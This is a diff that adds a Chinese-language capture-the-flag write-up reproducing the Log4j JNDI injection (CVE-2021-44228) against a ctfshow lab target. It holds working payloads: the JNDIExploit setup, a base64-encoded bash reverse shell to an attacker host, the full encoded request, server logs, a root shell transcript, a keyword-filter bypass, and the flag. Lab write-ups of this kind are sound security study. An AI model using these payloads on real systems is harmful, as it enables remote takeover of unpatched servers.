@@ -8572,6 +8572,190 @@ if __name__ == '__main__':
 
 ------
 
+### Log4j复现
+
+> Log4j复现，师傅们别到处RCE了。
+
+这道题是复现2021年12月的`Apche Log4j`远程代码执行漏洞，其漏洞编号是CVE-2021-44228。
+
+> Apache Log4j通过定义每一条日志信息的级别能够更加细致地控制日志生成地过程，受影响地版本中纯在JNDI注入漏洞，导致日志在记录用户输入地数据时，触发了注入漏洞，该漏洞可导致远程代码执行，且利用条件低，影响范围广，小到网站，大到可联网的车都受影响。
+
+先使用`dnslog`域名解析探测靶机是否存在`Log4j`漏洞，`POC`为`${jndi:ldap://dns}`，通过`ldap`协议进行域名解析，被记录则说明存在漏洞。
+
+在Google Cloud启动VPS，然后在本地主机用`gcloud`连接VPS。
+
+```bash
+gcloud compute ssh --zone "us-west1-a" "ctf-vps" --project "project-ip"
+```
+
+在VPS中安装相应的环境，如OpenLDAP服务端等。
+
+```bash
+sudo apt update && sudo apt upgrade -y
+sudo apt install slapd ldap-utils -y
+sudo systemctl start slapd  # 启动LDAP服务
+sudo systemctl enable slapd # 设置开机启动
+sudo systemctl status slapd # 检查服务状态
+sudo ufw allow 389/tcp    # LDAP
+sudo ufw allow 636/tcp    # LDAPS（如果配置了 TLS）
+sudo ufw allow 1389/tcp
+sudo ufw allow 8888/tcp
+sudo ufw enable
+sudo apt install netcat-openbsd -y   # nc
+sudo apt install maven openjdk-8-jdk -y  # 安装Java1.8和Maven
+sudo update-alternatives --config java  # 切换Java版本为1.8
+```
+
+在`GitHub`上搜索并安装`JNDIExploit`。
+
+```bash
+tyd@ctf-vps:~$ git clone https://github.com/zzwlpx/JNDIExploit.git
+tyd@ctf-vps:~$ cd JNDIExploit
+tyd@ctf-vps:~/JNDIExploit$ mvn clean package -DskipTests # 编译打包
+tyd@ctf-vps:~/JNDIExploit$ ls target/JNDIExploit-*.jar  # 检查是否完成打包
+target/JNDIExploit-1.0-SNAPSHOT.jar
+tyd@ctf-vps:~/JNDIExploit$ cp target/JNDIExploit-1.0-SNAPSHOT.jar ~/JNDIExploit.jar
+```
+
+启动`JNDIExploit`服务并监听1389和8888端口端口，以利用`Log4j2`远程代码执行漏洞。其中，`LDAP`服务会响应靶机的`JNDI`查询，当存在漏洞的应用解析`user=${jndi:ldap://34.169.108.13:1389/xx`时会连接此服务，`LDAP`服务会返回一个恶意Java类的下载地址URL。而`HTTP`服务用于托管恶意的`.class`文件（如反弹shell的`payload`），靶机从`LDAP`服务获取到URL后，会请求`HTTP`服务下载并执行该类。
+
+```bash
+tyd@ctf-vps:~$ java -jar JNDIExploit.jar -i 34.169.108.13 -p 8888
+[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 8888...
+```
+
+新开一个VPS窗口，使用`nc`工具同时监听9999端口，用于监听反弹shell。
+
+```bash
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+```
+
+该漏洞的`POC`是`user=${jndi:ldap://34.169.108.13:1389/TomcatBypass/TomcatEcho}`。该`POC`能进行回显显示，使用`cmd: ls /`和`cmd: cat /ctfshowflag`可以验证`Log4j`漏洞并拿到`flag`。
+
+用`bash -i >& /dev/tcp/34.169.108.13/9999 0>&1`命令反弹`shell`，简单来说是将标准输出重定向到`/dev/tcp/34.169.108.13/9999`端口文件中，即将靶机的标准输出通过`/dev/tcp`建立`Socket`连接重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此靶机的标准输入也就重定向到了攻击机，所以我们能在攻击机（我们的VPS）中输入命令并看到靶机的执行结果。将反弹`shell`的命令进行`base64`编码，
+
+```python
+>>> from base64 import b64encode
+>>> s = 'bash -i >& /dev/tcp/34.169.108.13/9999 0>&1'
+>>> b64encode(s.encode()).decode()
+b'YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ=='
+>>> from urllib.parse import quote
+>>> quote('YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ==')
+'YmFzaCAtaSA%2BJiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ%3D%3D'
+```
+
+构造`Payload`写入靶机的输入框中发送`GET`请求，`Payload`注入后`shell`会被反弹到`nc`监听的端口。
+
+```
+${jndi:ldap://34.169.108.13:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ%3D%3D}
+```
+
+靶机跳转的链接为：
+
+```
+/ctfshow?user=%24%7Bjndi%3Aldap%3A%2F%2F34.169.108.13%3A1389%2FTomcatBypass%2FCommand%2FBase64%2FYmFzaCAtaSA%252BJiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ%253D%253D%7D
+```
+
+靶机显示的内容为：
+
+> Hello ${jndi:ldap://34.169.108.13:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ%3D%3D}
+
+攻击机的`JNDIExploit`服务监听到的内容如下：
+
+```bash
+tyd@ctf-vps:~$ java -jar JNDIExploit.jar -i 34.169.108.13 -p 8888
+[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 8888...
+[+] Received LDAP Query: TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ==
+[+] Paylaod: command
+[+] Command: bash -i >& /dev/tcp/34.169.108.13/9999 0>&1
+[+] Sending LDAP ResourceRef result for TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ== with javax.el.ELProcessor payload
+[+] Return script:
+-----------------------------------------------
+{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var strs=new Array(3);
+        if(java.io.File.separator.equals('/')){
+            strs[0]='/bin/bash';
+            strs[1]='-c';
+            strs[2]='bash -i >& /dev/tcp/34.169.108.13/9999 0>&1';
+        }else{
+            strs[0]='cmd';
+            strs[1]='/C';
+            strs[2]='bash -i >& /dev/tcp/34.169.108.13/9999 0>&1';
+        }
+        java.lang.Runtime.getRuntime().exec(strs);")}
+-----------------------------------------------
+```
+
+攻击机的`nc`监听到的反弹`shell`如下，输入`ls /`和`cat /ctfshowflag`即可拿到`flag`。
+
+```bash
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 124.223.158.81 59848
+[root@38818a2bb06f bin]# ls
+ls
+bootstrap.jar
+catalina-tasks.xml
+catalina.bat
+catalina.sh
+ciphers.bat
+ciphers.sh
+commons-daemon-native.tar.gz
+commons-daemon.jar
+configtest.bat
+configtest.sh
+daemon.sh
+digest.bat
+digest.sh
+setclasspath.bat
+setclasspath.sh
+shutdown.bat
+shutdown.sh
+startup.bat
+startup.sh
+tomcat-juli.jar
+tomcat-native.tar.gz
+tool-wrapper.bat
+tool-wrapper.sh
+version.bat
+version.sh
+[root@38818a2bb06f bin]# ls /
+ls /
+anaconda-post.log
+bin
+ctfshowflag
+dev
+etc
+home
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+start.sh
+sys
+tmp
+usr
+var
+[root@38818a2bb06f bin]# cat /ctfshowflag
+cat /ctfshowflag
+ctfshow{d12bb9d8-7e52-4b4a-8804-8efbda591cad}
+```
+
+如果`jndi`关键字被屏蔽，绕过方法是`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ip:port/TomcatBypass/Command/Base64/xxxx`。
+
+提交`ctfshow{d12bb9d8-7e52-4b4a-8804-8efbda591cad}`即可。
+
+------
+
 ## [sqli-labs](https://github.com/Audi-1/sqli-labs)
 
 ### Less-1
